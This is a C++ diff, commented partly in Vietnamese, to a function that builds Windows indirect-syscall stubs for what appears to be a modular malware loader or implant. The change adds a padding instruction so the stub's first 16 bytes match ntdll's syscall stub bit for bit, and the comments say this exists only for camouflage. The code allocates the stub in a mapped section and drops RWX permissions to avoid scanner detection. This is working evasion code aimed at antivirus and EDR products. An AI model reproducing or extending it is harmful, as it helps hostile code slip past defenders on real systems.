@@ -493,21 +493,33 @@ inline bool BuildSyscallStub(int ssn, void** outStub) {
         return true;
     }
 
-    // Indirect stub — 22 bytes:
-    //   4C 8B D1                mov r10, rcx
-    //   B8 SSN 00 00 00         mov eax, SSN
-    //   FF 25 00 00 00 00       jmp qword ptr [rip+0]  ; qword ngay sau
-    //   <8 bytes gadget addr>
+    // Camouflaged indirect stub — 30 bytes (Module I).
+    // 16 byte đầu KHỚP HOÀN TOÀN với ntdll syscall stub head:
+    //   4C 8B D1                     mov r10, rcx                    ; 3
+    //   B8 SSN 00 00 00              mov eax, SSN                    ; 5
+    //   F6 04 25 08 03 FE 7F 01      test byte[0x7FFE0308], 1        ; 8  ← match ntdll
+    //   FF 25 00 00 00 00            jmp qword ptr [rip+0]           ; 6
+    //   <8 bytes gadget addr>                                        ; 8
+    // → memcmp(stub, ntdll_stub_head, 16) = 0 (giống nhau bit-perfect).
+    // `test` executed nhưng result IGNORED — chỉ để camouflage. Overhead <1 ns.
     // Module MM: alloc qua CreateFileMapping → region MEM_MAPPED.
     auto* stub = reinterpret_cast<uint8_t*>(AllocSectionRWX(32));
     if (!stub) return false;
 
+    // mov r10, rcx
     stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;
+    // mov eax, SSN
     stub[3] = 0xB8;
     *reinterpret_cast<uint32_t*>(stub + 4) = static_cast<uint32_t>(ssn);
-    stub[8]  = 0xFF; stub[9]  = 0x25;
-    stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;
-    *reinterpret_cast<uint64_t*>(stub + 14) = reinterpret_cast<uint64_t>(gadget);
+    // test byte ptr [0x7FFE0308], 1  (KUSER_SHARED_DATA.SystemCallStub check)
+    stub[8]  = 0xF6; stub[9]  = 0x04; stub[10] = 0x25;
+    stub[11] = 0x08; stub[12] = 0x03; stub[13] = 0xFE; stub[14] = 0x7F;
+    stub[15] = 0x01;
+    // jmp qword ptr [rip+0]  (indirect to gadget)
+    stub[16] = 0xFF; stub[17] = 0x25;
+    stub[18] = 0x00; stub[19] = 0x00; stub[20] = 0x00; stub[21] = 0x00;
+    // gadget address qword
+    *reinterpret_cast<uint64_t*>(stub + 22) = reinterpret_cast<uint64_t>(gadget);
 
     // Downgrade từ RWX → RX (giảm 1 anti-scan surface: RWX private region).
     DWORD oldProt = 0;
